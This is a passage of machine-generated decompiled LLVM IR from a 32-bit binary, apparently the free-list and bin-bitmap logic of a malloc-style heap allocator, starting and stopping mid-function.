dec_label_pc_8052c62:                             ; preds = %dec_label_pc_8052fff, %dec_label_pc_8053011, %dec_label_pc_8052c21, %dec_label_pc_8052c50
  %v0_8052c62 = load i32, i32* @edx, align 4
  %v1_8052c62 = add i32 %v0_8052c62, 8
  store i32 %v1_8052c62, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80532dd

dec_label_pc_8052c6a:                             ; preds = %dec_label_pc_8052c29
  %v0_8052c6e = call i32 @function_8052b5e()
  store i32 %v0_8052c6e, i32* %eax.global-to-local, align 4
  %v3_8052c73 = and i8 %v0_8052be0, 2
  %v4_8052c73 = icmp eq i8 %v3_8052c73, 0
  %v6_8052c73 = zext i8 %v3_8052c73 to i32
  %v9_8052c73 = and i32 %v1_8052be0, -256
  %v10_8052c73 = or i32 %v9_8052c73, %v6_8052c73
  store i32 %v10_8052c73, i32* @ebx, align 4
  br i1 %v4_8052c73, label %dec_label_pc_8052d66.preheader, label %dec_label_pc_8052c80

dec_label_pc_8052c80:                             ; preds = %dec_label_pc_8052c6a
  store i32 ptrtoint (i8* @global_var_8056bc0.206 to i32), i32* %stack_var_-92, align 4
  %v2_8052c88 = call i32 @function_80537a1(i32* bitcast (i8* @global_var_8056bc0.206 to i32*))
  store i32 %v2_8052c88, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d66.preheader

dec_label_pc_8052d66.preheader:                   ; preds = %dec_label_pc_8052c80, %dec_label_pc_8052c33, %dec_label_pc_8052c6a
  %stack_var_-40.0.ph = phi i32 [ %v2_8052c37, %dec_label_pc_8052c33 ], [ %v0_8052c6e, %dec_label_pc_8052c80 ], [ %v0_8052c6e, %dec_label_pc_8052c6a ]
  %v0_8052d669 = load i32, i32* @global_var_8056c00.210, align 1024
  store i32 %v0_8052d669, i32* @ebp, align 4
  %v9_8052d6c15 = icmp eq i32 %v0_8052d669, 134573044
  %v1_8052d7217 = icmp eq i1 %v9_8052d6c15, false
  br i1 %v1_8052d7217, label %dec_label_pc_8052c95.lr.ph, label %dec_label_pc_8052d78

dec_label_pc_8052c95.lr.ph:                       ; preds = %dec_label_pc_8052d66.preheader
  %v1_8052cbc = add i32 %v1_8052f78, 16
  br label %dec_label_pc_8052c95

dec_label_pc_8052c95:                             ; preds = %dec_label_pc_8052c95.lr.ph, %dec_label_pc_8052d66
  %v1_805328f = phi i32 [ %v0_8052d669, %dec_label_pc_8052c95.lr.ph ], [ %v0_8052d66, %dec_label_pc_8052d66 ]
  %v1_8052c95 = add i32 %v1_805328f, 4
  %v2_8052c95 = inttoptr i32 %v1_8052c95 to i32*
  %v3_8052c95 = load i32, i32* %v2_8052c95, align 4
  %v1_8052c98 = add i32 %v1_805328f, 12
  %v2_8052c98 = inttoptr i32 %v1_8052c98 to i32*
  %v3_8052c98 = load i32, i32* %v2_8052c98, align 4
  store i32 %v3_8052c98, i32* @edx, align 4
  %v1_8052c9b = and i32 %v3_8052c95, -4
  store i32 %v1_8052c9b, i32* @edi, align 4
  br i1 %v6_8052c31, label %dec_label_pc_8052cc7, label %dec_label_pc_8052ca8

dec_label_pc_8052ca8:                             ; preds = %dec_label_pc_8052c95
  %v9_8052ca8 = icmp eq i32 %v3_8052c98, 134573044
  %v1_8052cae = icmp eq i1 %v9_8052ca8, false
  br i1 %v1_8052cae, label %dec_label_pc_8052cc7, label %dec_label_pc_8052cb0

dec_label_pc_8052cb0:                             ; preds = %dec_label_pc_8052ca8
  %v1_8052cb0 = load i32, i32* @global_var_8056bf0.208, align 16
  %v12_8052cb0 = icmp eq i32 %v1_805328f, %v1_8052cb0
  %v1_8052cb6 = icmp eq i1 %v12_8052cb0, false
  br i1 %v1_8052cb6, label %dec_label_pc_8052cc7, label %dec_label_pc_8052cb8

dec_label_pc_8052cb8:                             ; preds = %dec_label_pc_8052cb0
  store i32 %v1_8052cbc, i32* %eax.global-to-local, align 4
  %v6_8052cc1 = icmp ugt i32 %v1_8052c9b, %v1_8052cbc
  br i1 %v6_8052cc1, label %dec_label_pc_8053278, label %dec_label_pc_8052cc7

dec_label_pc_8052cc7:                             ; preds = %dec_label_pc_8052cb8, %dec_label_pc_8052cb0, %dec_label_pc_8052ca8, %dec_label_pc_8052c95
  store i32 ptrtoint (i32* @global_var_8056bf4.209 to i32), i32* %eax.global-to-local, align 4
  %v2_8052ccc = add i32 %v3_8052c98, 8
  %v3_8052ccc = inttoptr i32 %v2_8052ccc to i32*
  store i32 ptrtoint (i32* @global_var_8056bf4.209 to i32), i32* %v3_8052ccc, align 4
  %v0_8052ccf = load i32, i32* @edx, align 4
  store i32 %v0_8052ccf, i32* @global_var_8056c00.210, align 4
  %v0_8052cd2 = load i32, i32* @edi, align 4
  %v15_8052cd2 = icmp eq i32 %v0_8052cd2, %v1_8052f78
  br i1 %v15_8052cd2, label %dec_label_pc_80532b9, label %dec_label_pc_8052cdc

dec_label_pc_8052cdc:                             ; preds = %dec_label_pc_8052cc7
  %v6_8052ce2 = icmp ugt i32 %v0_8052cd2, 255
  br i1 %v6_8052ce2, label %dec_label_pc_8052cf5, label %dec_label_pc_8052ce4

dec_label_pc_8052ce4:                             ; preds = %dec_label_pc_8052cdc
  %v2_8052ce6 = udiv i32 %v0_8052cd2, 8
  store i32 %v2_8052ce6, i32* %esi.global-to-local, align 4
  %v1_8052ce9 = mul nuw i32 %v2_8052ce6, 8
  %v2_8052ce9 = add i32 %v1_8052ce9, 134573036
  store i32 %v2_8052ce9, i32* @ebx, align 4
  %v1_8052cf0 = add i32 %v1_8052ce9, 134573044
  %v2_8052cf0 = inttoptr i32 %v1_8052cf0 to i32*
  %v3_8052cf0 = load i32, i32* %v2_8052cf0, align 4
  store i32 %v3_8052cf0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d3e

dec_label_pc_8052cf5:                             ; preds = %dec_label_pc_8052cdc
  store i32 %v0_8052cd2, i32* @eax, align 4
  %v0_8052cf7 = call i32 @function_8052b5e()
  store i32 %v0_8052cf7, i32* %esi.global-to-local, align 4
  %v1_8052cfe = mul i32 %v0_8052cf7, 8
  %v2_8052cfe = add i32 %v1_8052cfe, ptrtoint (i32* @global_var_8056bec.207 to i32)
  store i32 %v2_8052cfe, i32* %eax.global-to-local, align 4
  %v1_8052d05 = add i32 %v1_8052cfe, add (i32 ptrtoint (i32* @global_var_8056bec.207 to i32), i32 8)
  %v2_8052d05 = inttoptr i32 %v1_8052d05 to i32*
  %v3_8052d05 = load i32, i32* %v2_8052d05, align 4
  store i32 %v3_8052d05, i32* %edx.global-to-local, align 4
  store i32 %v3_8052d05, i32* @ebx, align 4
  %v12_8052d0e = icmp eq i32 %v3_8052d05, %v2_8052cfe
  br i1 %v12_8052d0e, label %dec_label_pc_8052d3e, label %dec_label_pc_8052d12

dec_label_pc_8052d12:                             ; preds = %dec_label_pc_8052cf5
  %v1_8052d12 = add i32 %v1_8052cfe, add (i32 ptrtoint (i32* @global_var_8056bec.207 to i32), i32 12)
  %v2_8052d12 = inttoptr i32 %v1_8052d12 to i32*
  %v3_8052d12 = load i32, i32* %v2_8052d12, align 4
  store i32 %v3_8052d12, i32* @ebx, align 4
  %v0_8052d15 = load i32, i32* @edi, align 4
  %v2_8052d15 = add i32 %v3_8052d12, 4
  %v3_8052d15 = inttoptr i32 %v2_8052d15 to i32*
  %v4_8052d15 = load i32, i32* %v3_8052d15, align 4
  %v10_8052d15 = icmp ult i32 %v0_8052d15, %v4_8052d15
  %v1_8052d18 = icmp eq i1 %v10_8052d15, false
  br i1 %v1_8052d18, label %dec_label_pc_8052d20, label %dec_label_pc_8052d3e

dec_label_pc_8052d20:                             ; preds = %dec_label_pc_8052d12
  %v1_8052d22 = or i32 %v0_8052d15, 1
  store i32 %v1_8052d22, i32* %eax.global-to-local, align 4
  store i32 %v3_8052d05, i32* %ebx.global-to-local, align 4
  %v2_8052d36105 = add i32 %v3_8052d05, 4
  %v3_8052d36106 = inttoptr i32 %v2_8052d36105 to i32*
  %v4_8052d36107 = load i32, i32* %v3_8052d36106, align 4
  %v10_8052d36108 = icmp ult i32 %v1_8052d22, %v4_8052d36107
  br i1 %v10_8052d36108, label %dec_label_pc_8052d27, label %dec_label_pc_8052d3b

dec_label_pc_8052d27:                             ; preds = %dec_label_pc_8052d20, %dec_label_pc_8052d27
  %v0_8052d3b109 = phi i32 [ %v3_8052d2b, %dec_label_pc_8052d27 ], [ %v3_8052d05, %dec_label_pc_8052d20 ]
  store i32 %v0_8052d3b109, i32* %ecx.global-to-local, align 4
  %v1_8052d2b = add i32 %v0_8052d3b109, 8
  %v2_8052d2b = inttoptr i32 %v1_8052d2b to i32*
  %v3_8052d2b = load i32, i32* %v2_8052d2b, align 4
  store i32 %v3_8052d2b, i32* %ecx.global-to-local, align 4
  store i32 %v3_8052d2b, i32* %ebx.global-to-local, align 4
  %v2_8052d36 = add i32 %v3_8052d2b, 4
  %v3_8052d36 = inttoptr i32 %v2_8052d36 to i32*
  %v4_8052d36 = load i32, i32* %v3_8052d36, align 4
  %v10_8052d36 = icmp ult i32 %v1_8052d22, %v4_8052d36
  br i1 %v10_8052d36, label %dec_label_pc_8052d27, label %dec_label_pc_8052d3b

dec_label_pc_8052d3b:                             ; preds = %dec_label_pc_8052d27, %dec_label_pc_8052d20
  %v0_8052d3b.lcssa = phi i32 [ %v3_8052d05, %dec_label_pc_8052d20 ], [ %v3_8052d2b, %dec_label_pc_8052d27 ]
  %v1_8052d3b = add i32 %v0_8052d3b.lcssa, 12
  %v2_8052d3b = inttoptr i32 %v1_8052d3b to i32*
  %v3_8052d3b = load i32, i32* %v2_8052d3b, align 4
  store i32 %v3_8052d3b, i32* @ebx, align 4
  br label %dec_label_pc_8052d3e

dec_label_pc_8052d3e:                             ; preds = %dec_label_pc_8052ce4, %dec_label_pc_8052d12, %dec_label_pc_8052cf5, %dec_label_pc_8052d3b
  %v0_8052d3e = phi i32 [ %v0_8052cf7, %dec_label_pc_8052cf5 ], [ %v0_8052cf7, %dec_label_pc_8052d3b ], [ %v0_8052cf7, %dec_label_pc_8052d12 ], [ %v2_8052ce6, %dec_label_pc_8052ce4 ]
  %stack_var_-64.1 = phi i32 [ %v2_8052cfe, %dec_label_pc_8052cf5 ], [ %v0_8052d3b.lcssa, %dec_label_pc_8052d3b ], [ %v2_8052cfe, %dec_label_pc_8052d12 ], [ %v3_8052cf0, %dec_label_pc_8052ce4 ]
  %v1_8052d40 = urem i32 %v0_8052d3e, 32
  %v2_8052d40 = icmp eq i32 %v1_8052d40, 0
  store i32 %v1_8052d40, i32* %esi.global-to-local, align 4
  store i32 %v1_8052d40, i32* %ecx.global-to-local, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_8052d4a = sdiv i32 %v0_8052d3e, 32
  store i32 %v2_8052d4a, i32* %edx.global-to-local, align 4
  br i1 %v2_8052d40, label %dec_label_pc_8052d66, label %bb

bb:                                               ; preds = %dec_label_pc_8052d3e
  %v5_8052d4d = shl i32 1, %v1_8052d40
  store i32 %v5_8052d4d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d66

dec_label_pc_8052d66:                             ; preds = %dec_label_pc_8052d3e, %bb
  %v5_8052d4f = phi i32 [ 1, %dec_label_pc_8052d3e ], [ %v5_8052d4d, %bb ]
  %v1_8052d4f = mul nsw i32 %v2_8052d4a, 4
  %v2_8052d4f = add i32 %v1_8052d4f, ptrtoint (i32* @global_var_8056ef4.211 to i32)
  %v3_8052d4f = inttoptr i32 %v2_8052d4f to i32*
  %v4_8052d4f = load i32, i32* %v3_8052d4f, align 4
  %v6_8052d4f = or i32 %v4_8052d4f, %v5_8052d4f
  store i32 %v6_8052d4f, i32* %v3_8052d4f, align 4
  %v0_8052d56 = load i32, i32* @ebx, align 4
  %v1_8052d56 = load i32, i32* @ebp, align 4
  %v2_8052d56 = add i32 %v1_8052d56, 12
  %v3_8052d56 = inttoptr i32 %v2_8052d56 to i32*
  store i32 %v0_8052d56, i32* %v3_8052d56, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_8052d5d = load i32, i32* @ebp, align 4
  %v2_8052d5d = add i32 %v1_8052d5d, 8
  %v3_8052d5d = inttoptr i32 %v2_8052d5d to i32*
  store i32 %stack_var_-64.1, i32* %v3_8052d5d, align 4
  %v0_8052d60 = load i32, i32* @ebp, align 4
  %v1_8052d60 = load i32, i32* @ebx, align 4
  %v2_8052d60 = add i32 %v1_8052d60, 8
  %v3_8052d60 = inttoptr i32 %v2_8052d60 to i32*
  store i32 %v0_8052d60, i32* %v3_8052d60, align 4
  %v0_8052d63 = load i32, i32* @ebp, align 4
  %v1_8052d63 = load i32, i32* @esi, align 4
  %v2_8052d63 = add i32 %v1_8052d63, 12
  %v3_8052d63 = inttoptr i32 %v2_8052d63 to i32*
  store i32 %v0_8052d63, i32* %v3_8052d63, align 4
  %v0_8052d66 = load i32, i32* @global_var_8056c00.210, align 1024
  store i32 %v0_8052d66, i32* @ebp, align 4
  %v9_8052d6c = icmp eq i32 %v0_8052d66, 134573044
  %v1_8052d72 = icmp eq i1 %v9_8052d6c, false
  br i1 %v1_8052d72, label %dec_label_pc_8052c95, label %dec_label_pc_8052d78

dec_label_pc_8052d78:                             ; preds = %dec_label_pc_8052d66, %dec_label_pc_8052d66.preheader
  br i1 %v8_8052c29, label %dec_label_pc_8052e06, label %dec_label_pc_8052d86

dec_label_pc_8052d86:                             ; preds = %dec_label_pc_8052d78
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_8052d8a = mul i32 %stack_var_-40.0.ph, 8
  %v2_8052d8a = add i32 %v1_8052d8a, ptrtoint (i32* @global_var_8056bec.207 to i32)
  store i32 %v2_8052d8a, i32* %edx.global-to-local, align 4
  %v1_8052d91 = add i32 %v1_8052d8a, add (i32 ptrtoint (i32* @global_var_8056bec.207 to i32), i32 12)
  %v2_8052d91 = inttoptr i32 %v1_8052d91 to i32*
  %storemerge1.pre = load i32, i32* %v2_8052d91, align 4
  br label %dec_label_pc_8052e02

dec_label_pc_8052d96:                             ; preds = %dec_label_pc_8052e02
  %v1_8052d96 = add i32 %v4_8052dad, 4
  %v2_8052d96 = inttoptr i32 %v1_8052d96 to i32*
  %v3_8052d96 = load i32, i32* %v2_8052d96, align 4
  store i32 %v3_8052d96, i32* %ebx.global-to-local, align 4
  %v1_8052d99 = add i32 %v4_8052dad, 12
  %v2_8052d99 = inttoptr i32 %v1_8052d99 to i32*
  %v3_8052d99 = load i32, i32* %v2_8052d99, align 4
  store i32 %v3_8052d99, i32* @ecx, align 4
  %v1_8052d9c = and i32 %v3_8052d96, -4
  store i32 %v1_8052d9c, i32* @ebx, align 4
  %v10_8052d9f = icmp ult i32 %v1_8052d9c, %v1_8052f78
  br i1 %v10_8052d9f, label %dec_label_pc_8052e02, label %dec_label_pc_8052da5

dec_label_pc_8052da5:                             ; preds = %dec_label_pc_8052d96
  %v1_8052da5 = add i32 %v4_8052dad, 8
  %v2_8052da5 = inttoptr i32 %v1_8052da5 to i32*
  %v3_8052da5 = load i32, i32* %v2_8052da5, align 4
  store i32 %v3_8052da5, i32* @edx, align 4
  %v1_8052da8 = add i32 %v3_8052da5, 12
  %v2_8052da8 = inttoptr i32 %v1_8052da8 to i32*
  %v3_8052da8 = load i32, i32* %v2_8052da8, align 4
  %v15_8052da8 = icmp eq i32 %v3_8052da8, %v4_8052dad
  %v1_8052dab = icmp eq i1 %v15_8052da8, false
  br i1 %v1_8052dab, label %dec_label_pc_8052db2, label %dec_label_pc_8052dad

dec_label_pc_8052dad:                             ; preds = %dec_label_pc_8052da5
  %v1_8052dad = add i32 %v3_8052d99, 8
  %v2_8052dad = inttoptr i32 %v1_8052dad to i32*
  %v3_8052dad = load i32, i32* %v2_8052dad, align 4
  %v15_8052dad = icmp eq i32 %v3_8052dad, %v4_8052dad
  br i1 %v15_8052dad, label %dec_label_pc_8052db7, label %dec_label_pc_8052db2

dec_label_pc_8052db2:                             ; preds = %dec_label_pc_8052dad, %dec_label_pc_8052da5
  %v0_8052db2 = call i32 @function_8053ae5()
  store i32 %v0_8052db2, i32* %eax.global-to-local, align 4
  %v0_8052db7.pre = load i32, i32* @ebx, align 4
  %v0_8052dbd.pre = load i32, i32* @ecx, align 4
  %v1_8052dbd.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052db7

dec_label_pc_8052db7:                             ; preds = %dec_label_pc_8052dad, %dec_label_pc_8052db2
  %v1_8052dbd = phi i32 [ %v3_8052da5, %dec_label_pc_8052dad ], [ %v1_8052dbd.pre, %dec_label_pc_8052db2 ]
  %v0_8052dbd = phi i32 [ %v3_8052d99, %dec_label_pc_8052dad ], [ %v0_8052dbd.pre, %dec_label_pc_8052db2 ]
  %v0_8052db7 = phi i32 [ %v1_8052d9c, %dec_label_pc_8052dad ], [ %v0_8052db7.pre, %dec_label_pc_8052db2 ]
  %v5_8052db9 = sub i32 %v0_8052db7, %v1_8052f78
  store i32 %v5_8052db9, i32* %esi.global-to-local, align 4
  %v2_8052dbd = add i32 %v1_8052dbd, 12
  %v3_8052dbd = inttoptr i32 %v2_8052dbd to i32*
  store i32 %v0_8052dbd, i32* %v3_8052dbd, align 4
  %v0_8052dc0 = load i32, i32* @edx, align 4
  %v1_8052dc0 = load i32, i32* @ecx, align 4
  %v2_8052dc0 = add i32 %v1_8052dc0, 8
  %v3_8052dc0 = inttoptr i32 %v2_8052dc0 to i32*
  store i32 %v0_8052dc0, i32* %v3_8052dc0, align 4
  %v0_8052dc3 = load i32, i32* %esi.global-to-local, align 4
  %v0_8052dc6 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052dc6 = add i32 %v0_8052dc6, 8
  store i32 %v1_8052dc6, i32* %ecx.global-to-local, align 4
  %tmp126 = icmp ult i32 %v0_8052dc3, 16
  br i1 %tmp126, label %dec_label_pc_80532c7, label %dec_label_pc_8052dcf

dec_label_pc_8052dcf:                             ; preds = %dec_label_pc_8052db7
  %v2_8052dd3 = add i32 %v0_8052dc6, %v1_8052f78
  store i32 %v2_8052dd3, i32* @edx, align 4
  %v1_8052dd6 = or i32 %v1_8052f78, 1
  store i32 %v1_8052dd6, i32* %ebx.global-to-local, align 4
  %v2_8052dd9 = add i32 %v0_8052dc6, 4
  %v3_8052dd9 = inttoptr i32 %v2_8052dd9 to i32*
  store i32 %v1_8052dd6, i32* %v3_8052dd9, align 4
  %v0_8052ddc = load i32, i32* %esi.global-to-local, align 4
  %v1_8052dde = or i32 %v0_8052ddc, 1
  store i32 %v1_8052dde, i32* %eax.global-to-local, align 4
  %v0_8052de1 = load i32, i32* @edx, align 4
  %v1_8052de1 = load i32, i32* @ebp, align 4
  %v2_8052de1 = add i32 %v1_8052de1, 8
  %v3_8052de1 = inttoptr i32 %v2_8052de1 to i32*
  store i32 %v0_8052de1, i32* %v3_8052de1, align 4
  %v0_8052de4 = load i32, i32* @edx, align 4
  %v1_8052de4 = load i32, i32* @ebp, align 4
  %v2_8052de4 = add i32 %v1_8052de4, 12
  %v3_8052de4 = inttoptr i32 %v2_8052de4 to i32*
  store i32 %v0_8052de4, i32* %v3_8052de4, align 4
  %v0_8052de7 = load i32, i32* @edx, align 4
  %v1_8052de7 = add i32 %v0_8052de7, 8
  %v2_8052de7 = inttoptr i32 %v1_8052de7 to i32*
  store i32 ptrtoint (i32* @global_var_8056bf4.209 to i32), i32* %v2_8052de7, align 4
  %v0_8052dee = load i32, i32* @edx, align 4
  %v1_8052dee = add i32 %v0_8052dee, 12
  %v2_8052dee = inttoptr i32 %v1_8052dee to i32*
  store i32 ptrtoint (i32* @global_var_8056bf4.209 to i32), i32* %v2_8052dee, align 4
  %v0_8052df5 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052df5 = load i32, i32* @edx, align 4
  %v2_8052df5 = add i32 %v1_8052df5, 4
  %v3_8052df5 = inttoptr i32 %v2_8052df5 to i32*
  store i32 %v0_8052df5, i32* %v3_8052df5, align 4
  %v0_8052df8 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052df8 = load i32, i32* @edx, align 4
  %v3_8052df8 = add i32 %v1_8052df8, %v0_8052df8
  %v4_8052df8 = inttoptr i32 %v3_8052df8 to i32*
  store i32 %v0_8052df8, i32* %v4_8052df8, align 4
  br label %dec_label_pc_80532cc

dec_label_pc_8052e02:                             ; preds = %dec_label_pc_8052d96, %dec_label_pc_8052d86
  %v4_8052dad = phi i32 [ %storemerge1.pre, %dec_label_pc_8052d86 ], [ %v3_8052d99, %dec_label_pc_8052d96 ]
  store i32 %v4_8052dad, i32* %eax.global-to-local, align 4
  %v12_8052e02 = icmp eq i32 %v4_8052dad, %v2_8052d8a
  %v1_8052e04 = icmp eq i1 %v12_8052e02, false
  br i1 %v1_8052e04, label %dec_label_pc_8052d96, label %dec_label_pc_8052e06.loopexit

dec_label_pc_8052e06.loopexit:                    ; preds = %dec_label_pc_8052e02
  br label %dec_label_pc_8052e06

dec_label_pc_8052e06:                             ; preds = %dec_label_pc_8052e06.loopexit, %dec_label_pc_8052d78
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_8052e0f = add i32 %stack_var_-40.0.ph, 1
  %v2_8052e12 = udiv i32 %v1_8052e0f, 32
  store i32 %v2_8052e12, i32* @edi, align 4
  %v1_8052e15 = mul i32 %v1_8052e0f, 8
  %v2_8052e15 = add i32 %v1_8052e15, ptrtoint (i32* @global_var_8056bec.207 to i32)
  store i32 %v2_8052e15, i32* %ebx.global-to-local, align 4
  %v1_8052e1c = urem i32 %v1_8052e0f, 32
  %v2_8052e1c = icmp eq i32 %v1_8052e1c, 0
  store i32 %v1_8052e1c, i32* %ecx.global-to-local, align 4
  %v1_8052e1f = mul nuw nsw i32 %v2_8052e12, 4
  %v2_8052e1f = add i32 %v1_8052e1f, ptrtoint (i32* @global_var_8056ef4.211 to i32)
  %v3_8052e1f = inttoptr i32 %v2_8052e1f to i32*
  %v4_8052e1f = load i32, i32* %v3_8052e1f, align 4
  store i32 %v4_8052e1f, i32* %edx.global-to-local, align 4
  br i1 %v2_8052e1c, label %.preheader, label %bb88

bb88:                                             ; preds = %dec_label_pc_8052e06
  %v5_8052e26 = shl i32 1, %v1_8052e1c
  store i32 %v5_8052e26, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_8052e06, %bb88, %dec_label_pc_8052e67
  %v1_8052e28 = phi i32 [ %v1_8052e28.pre, %dec_label_pc_8052e67 ], [ %v4_8052e1f, %bb88 ], [ %v4_8052e1f, %dec_label_pc_8052e06 ]
  %v0_8052e2c = phi i32 [ %v0_8052e28.pre, %dec_label_pc_8052e67 ], [ %v5_8052e26, %bb88 ], [ 1, %dec_label_pc_8052e06 ]
  %tmp89 = icmp ule i32 %v0_8052e2c, %v1_8052e28
  %v1_8052e2c = icmp eq i32 %v0_8052e2c, 0
  %v1_8052e2e = icmp eq i1 %v1_8052e2c, false
  %or.cond = and i1 %tmp89, %v1_8052e2e
  br i1 %or.cond, label %dec_label_pc_8052e2c.dec_label_pc_8052e5c.preheader_crit_edge, label %dec_label_pc_8052e30.preheader

dec_label_pc_8052e2c.dec_label_pc_8052e5c.preheader_crit_edge: ; preds = %.preheader
  %v0_8052e577.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052e5c.preheader

dec_label_pc_8052e30.preheader:                   ; preds = %.preheader
  %v0_8052e30.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8052e30

dec_label_pc_8052e30:                             ; preds = %dec_label_pc_8052e30.preheader, %dec_label_pc_8052e3a
  %v0_8052e30 = phi i32 [ %v0_8052e30.pre, %dec_label_pc_8052e30.preheader ], [ %v1_8052e30, %dec_label_pc_8052e3a ]
  %v1_8052e30 = add i32 %v0_8052e30, 1
  store i32 %v1_8052e30, i32* @edi, align 4
  %v6_8052e34 = icmp ugt i32 %v1_8052e30, 2
  br i1 %v6_8052e34, label %dec_label_pc_8052ee3.loopexit, label %dec_label_pc_8052e3a

dec_label_pc_8052e3a:                             ; preds = %dec_label_pc_8052e30
  %v1_8052e3a = mul i32 %v1_8052e30, 4
  %v2_8052e3a = add i32 %v1_8052e3a, ptrtoint (i32* @global_var_8056ef4.211 to i32)
  %v3_8052e3a = inttoptr i32 %v2_8052e3a to i32*
  %v4_8052e3a = load i32, i32* %v3_8052e3a, align 4
  store i32 %v4_8052e3a, i32* %edx.global-to-local, align 4
  %v1_8052e41 = icmp eq i32 %v4_8052e3a, 0
  br i1 %v1_8052e41, label %dec_label_pc_8052e30, label %dec_label_pc_8052e45

dec_label_pc_8052e45:                             ; preds = %dec_label_pc_8052e3a
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_8052e4c = mul i32 %v1_8052e30, 256
  store i32 %v2_8052e4c, i32* %eax.global-to-local, align 4
  %v1_8052e4f = add i32 %v2_8052e4c, ptrtoint (i32* @global_var_8056bec.207 to i32)
  store i32 %v1_8052e4f, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052e5c.preheader

dec_label_pc_8052e5c.preheader:                   ; preds = %dec_label_pc_8052e2c.dec_label_pc_8052e5c.preheader_crit_edge, %dec_label_pc_8052e45
  %v0_8052e577 = phi i32 [ %v1_8052e4f, %dec_label_pc_8052e45 ], [ %v0_8052e577.pre, %dec_label_pc_8052e2c.dec_label_pc_8052e5c.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_8052e45 ], [ %v0_8052e2c, %dec_label_pc_8052e2c.dec_label_pc_8052e5c.preheader_crit_edge ]
  %v0_8052e6e = phi i32 [ %v4_8052e3a, %dec_label_pc_8052e45 ], [ %v1_8052e28, %dec_label_pc_8052e2c.dec_label_pc_8052e5c.preheader_crit_edge ]
  %v2_8052e5c4 = and i32 %v0_8052e6e, %esi.promoted
  %v3_8052e5c5 = icmp eq i32 %v2_8052e5c4, 0
  br i1 %v3_8052e5c5, label %dec_label_pc_8052e57, label %dec_label_pc_8052e60

dec_label_pc_8052e57:                             ; preds = %dec_label_pc_8052e5c.preheader, %dec_label_pc_8052e57
  %v2_8052e5a18 = phi i32 [ %v2_8052e5a, %dec_label_pc_8052e57 ], [ %esi.promoted, %dec_label_pc_8052e5c.preheader ]
  %v0_8052e578 = phi i32 [ %v1_8052e57, %dec_label_pc_8052e57 ], [ %v0_8052e577, %dec_label_pc_8052e5c.preheader ]
  %v1_8052e57 = add i32 %v0_8052e578, 8
  %v2_8052e5a = mul i32 %v2_8052e5a18, 2
  %v2_8052e5c = and i32 %v2_8052e5a, %v0_8052e6e
  %v3_8052e5c = icmp eq i32 %v2_8052e5c, 0
  br i1 %v3_8052e5c, label %dec_label_pc_8052e57, label %dec_label_pc_8052e5c.dec_label_pc_8052e60_crit_edge

dec_label_pc_8052e5c.dec_label_pc_8052e60_crit_edge: ; preds = %dec_label_pc_8052e57
  store i32 %v1_8052e57, i32* %ebx.global-to-local, align 4
  store i32 %v2_8052e5a, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052e60

dec_label_pc_8052e60:                             ; preds = %dec_label_pc_8052e5c.dec_label_pc_8052e60_crit_edge, %dec_label_pc_8052e5c.preheader
  %v0_8052e70 = phi i32 [ %v2_8052e5a, %dec_label_pc_8052e5c.dec_label_pc_8052e60_crit_edge ], [ %esi.promoted, %dec_label_pc_8052e5c.preheader ]
  %v1_8052e8a = phi i32 [ %v1_8052e57, %dec_label_pc_8052e5c.dec_label_pc_8052e60_crit_edge ], [ %v0_8052e577, %dec_label_pc_8052e5c.preheader ]
  %v1_8052e60 = add i32 %v1_8052e8a, 12
  %v2_8052e60 = inttoptr i32 %v1_8052e60 to i32*
  %v3_8052e60 = load i32, i32* %v2_8052e60, align 4
  store i32 %v3_8052e60, i32* %ecx.global-to-local, align 4
  %v12_8052e63 = icmp eq i32 %v3_8052e60, %v1_8052e8a
  %v1_8052e65 = icmp eq i1 %v12_8052e63, false
  br i1 %v1_8052e65, label %dec_label_pc_8052e7b, label %dec_label_pc_8052e67

dec_label_pc_8052e67:                             ; preds = %dec_label_pc_8052e60
  %v1_8052e69 = add i32 %v3_8052e60, 8
  store i32 %v1_8052e69, i32* %ebx.global-to-local, align 4
  %v1_8052e6c = sub i32 -1, %v0_8052e70
  store i32 %v1_8052e6c, i32* %eax.global-to-local, align 4
  %v2_8052e6e = and i32 %v0_8052e6e, %v1_8052e6c
  store i32 %v2_8052e6e, i32* %edx.global-to-local, align 4
  %v2_8052e70 = mul i32 %v0_8052e70, 2
  store i32 %v2_8052e70, i32* %esi.global-to-local, align 4
  %v1_8052e72 = load i32, i32* @edi, align 4
  %v2_8052e72 = mul i32 %v1_8052e72, 4
  %v3_8052e72 = add i32 %v2_8052e72, ptrtoint (i32* @global_var_8056ef4.211 to i32)
  %v4_8052e72 = inttoptr i32 %v3_8052e72 to i32*
  store i32 %v2_8052e6e, i32* %v4_8052e72, align 4
  %v0_8052e28.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_8052e28.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_8052e7b:                             ; preds = %dec_label_pc_8052e60
  %v1_8052e7b = add i32 %v3_8052e60, 4
  %v2_8052e7b = inttoptr i32 %v1_8052e7b to i32*
  %v3_8052e7b = load i32, i32* %v2_8052e7b, align 4
  store i32 %v3_8052e7b, i32* %edx.global-to-local, align 4
  %v1_8052e7e = add i32 %v3_8052e60, 12
  %v2_8052e7e = inttoptr i32 %v1_8052e7e to i32*
  %v3_8052e7e = load i32, i32* %v2_8052e7e, align 4
  store i32 %v3_8052e7e, i32* %eax.global-to-local, align 4
  %v1_8052e81 = and i32 %v3_8052e7b, -4
  store i32 %v1_8052e81, i32* @edx, align 4
